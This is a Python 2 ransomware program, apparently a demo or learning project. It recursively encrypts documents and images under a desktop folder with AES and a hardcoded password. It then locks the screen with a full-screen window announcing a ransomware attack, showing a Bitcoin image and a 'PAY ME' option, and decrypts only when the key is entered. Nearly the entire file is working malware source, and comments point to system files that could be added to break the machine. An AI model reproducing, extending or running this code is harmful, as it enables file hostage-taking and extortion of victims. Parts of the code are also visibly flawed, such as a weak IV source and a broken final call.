#Gain access to operating system & using random IV later in code
import os, random
import ntpath

from Crypto.Cipher import AES

#Hashing algorithm
from Crypto.Hash import SHA256
import tkMessageBox
import ttk
from Tkinter import *
from PIL import Image, ImageTk
import time
import sys
from myimages import *
pic=imageString#GIF decoded to string. imageString from myimages.py
startdirs = ['/Users/test/Desktop']


def discoverFiles(startpath):
    '''
    Walk the path recursively down from startpath, and perform method on matching files.

    :startpath: a directory (preferably absolute) from which to start recursing down.
    :yield: a generator of filenames matching the conditions

    Notes:
        - no error checking is done. It is assumed the current user has rwx on
          every file and directory from the startpath down.

        - state is not kept. If this functions raises an Exception at any point,
          There is no way of knowing where to continue from.
    '''

    # This is a file extension list of all files that may want to be encrypted.
    # They are grouped by category. If a category is not wanted, Comment that line.
    # All files uncommented by default should be harmless to the system
    # that is: Encrypting all files of all the below types should leave a system in a bootable state,
    # BUT applications which depend on such resources may become broken.
    # This will not cover all files, but it should be a decent range.
    extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        # 'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
        # 'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
        # 'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
        'jpg','txt',
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
        # 'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
        # 'yml', 'yaml', 'json', 'xml', 'csv', # structured data
        # 'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

        # 'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
        # 'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
        # 'java', 'class', 'jar', # java source code
        # 'ps', 'bat', 'vb', # windows based scripts
        # 'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
        # 'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

        # 'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path


def path_leaf(path):
    head, tail = ntpath.split(path)
    return tail or ntpath.basename(head)


def path_branch(path):
    head, tail = ntpath.split(path)
    return head or ntpath.basename(tail)


def encrypt(key, filename):
    ntpath.basename(filename)

    # Chunks that will be pulled out of the file
    chunksize = 64 * 1024

    # Name of the file once it has been encrypted
    outputFile = path_branch(filename) + "\\" + "(encrypted)" + path_leaf(filename)

    # Filesize of the current file thats being encrypted; Fills file with 16 bytes and fills left hand side of string with zero's
    filesize = str(os.path.getsize(filename)).zfill(16)
    # Generate random IV
    IV = ''

    for i in range(16):
        # Random integer between 0-0xFF, IV generates 16 characters
        IV += chr(random.randint(0, 0xFF))
    print IV
    # Take the key thats passed in the function using Cipher Block Chaining (CBC); Insert IV for the AES
    encryptor = AES.new(key, AES.MODE_CBC, IV)

    # Opening file we want to encrypt in read binary, calling that file an "infile:
    with open(filename, 'rb') as infile:

        # Take the output file in write binary
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize)

            outfile.write(IV)

            while True:
                # Read the chunksize that was specified above
                chunk = infile.read(chunksize)

                # If chunk has nothing inside of it, break
                if len(chunk) == 0:
                    break
                # Grab the remainder
                elif len(chunk) % 16 != 0:

                    # Padding the chunk with spaces, 16 minus the remainder of the length of the chunksize
                    chunk += ' ' * (16 - (len(chunk) % 16))

                # Writes out the encrypted chunksize
                outfile.write(encryptor.encrypt(chunk))


def decrypt(key, filename):
    chunksize = 64 * 1024

    # Grabbing everything after the first 11 characters, since everything after the first 11 characters is the filename
    outputFile = path_branch(filename) + "\\" + path_leaf(filename)[11:]

    with open(filename, 'rb') as infile:
        filesize = long(infile.read(16))
        IV = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(outputFile, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break

                # Decrypt the chunk that is in the encrypted file
                outfile.write(decryptor.decrypt(chunk))

            # Reduces all of the padding added above, reducing to the original filesize before encryption
            outfile.truncate(filesize)


def getKey(password):
    hasher = SHA256.new(password)

    # Returns the hash of the password being created
    return hasher.digest()


def Main(password):

    for currentDir in startdirs:
        for file in discoverFiles(currentDir):
            encrypt(getKey(password), file)


# Main part of the program that has the background and window sizes
root = Tk()


class FullScreenApp(object):
    def __init__(self, master, **kwargs):
        self.master=master
        pad=3
        self._geom='200x200+0+0'
        master.geometry("{0}x{1}+0+0".format(
            master.winfo_screenwidth()-pad, master.winfo_screenheight()-pad))
        master.bind('<Escape>',self.toggle_geom)
    def toggle_geom(self,event):
        geom=self.master.winfo_geometry()
        print(geom,self._geom)
        self.master.geometry(self._geom)
        self._geom=geom



root.title("This is a RansomWare Attack")
root.configure(background="black")
root.overrideredirect(True)
#tempkey = "JacobIsAGreatCoder"
tempkey = "Q1W2E3R4T5Y6U7I8O9P0123"
Main(tempkey)
root.overrideredirect(True)

def submit_function():
    count = 0
    while count < 1:
            tkMessageBox.showinfo("CHECKING KEY...", "FILES NOW DECRYPTED. THANK YOU!!!")
            count += 1
    exit()

def Messages():
    global entering
    string = entering.get()
    if string == tempkey:

        print string

        for currentDir in startdirs:
            for file in discoverFiles(currentDir):
                decrypt(getKey(string), file)

        tkMessageBox.showinfo("Checker", "YOUR FILES ARE NOW SAFE. THANK YOU!!!")
        exit()
    else:
        tkMessageBox.showerror("ERROR", "Your Key Entered Is Not Correct!! REMOVING TIME!!")


def submit_denied():
    tkMessageBox.showinfo("ACCESS DENIED", "KEY NOT VALID. TRY AGAIN!!!!")

def countdown_timer(self):
    counter = 25
 #   while counter > 0:

def ListRandomNumbers():
    scrolling = Scrollbar(root).place(x=100, y=70, height=350)
    ListBoxText = Listbox(root, height=2, width=15, bg="RED")
    ListBoxText.place(x=1, y=70)
    ListBoxText.insert(0, "000110101101010")
    ListBoxText.insert(0, "001010101001010")
    ListBoxText.insert(0, "110100101010010")
    #ListBoxText.insert(0, "42  70")
    #ListBoxText.place(x=3, y=70)
    #for random_numbers in [ListBoxText]:
        #ListBoxText.insert(END, random_numbers)


#This is the main banner at the top of the page
FirstHeading = Label(root, relief="raised", text="THIS IS A RANSOMWARE ATTACK ", font=("helvetica", 40, "bold"), bg="PURPLE",
                     fg="RED").pack()
#This is the text and submit box for the program
entering = Entry(root, width=80, relief="sunken")
entering.place(x=250, y=500, height=28)
entering.focus_set()

#SUBMIT button that is listening to a users actions
button1 = Button(root, text="SUBMIT", fg="BLUE", relief="raised", command=Messages,
            bg="RED").place(x=750, y=500)

#COUNTDOWNTIMER
timer = Label(root, font=("ARIAL", 40, "bold"), bg="RED", width=14).place(x=250, y=448, height=45)

#This is where the layers are for the designed image
ListRandomNumbers()

#CODE to display the description
DescriptionImage = Image.open("Capture.GIF")
tkimage = ImageTk.PhotoImage(DescriptionImage)
LabelIt = Label(root, image=tkimage, relief="sunken").pack()

#Bitcoin Image
BitcoinImage = Image.open("bitcoin.png")
BC = ImageTk.PhotoImage(BitcoinImage)
LabelIt2 = Label(root, image=BC, height=100)
LabelIt2.place(x=200, y=535)

#These are to display the check button boxes
Chooser = Checkbutton(root, bg="BLUE", text="DECRYPT YOUR FILES").place(x=25, y=500)
Chooser2 = Checkbutton(root, bg="BLUE", text="AVOID BRICKING SYSTEM").place(x=25, y=520)
Chooser3 = Checkbutton(root, bg="BLUE", text="PAY ME").place(x=25, y=540)
#update_time()

app=FullScreenApp(root)
root.mainloop()







if __name__ == '__main__':
    Main()


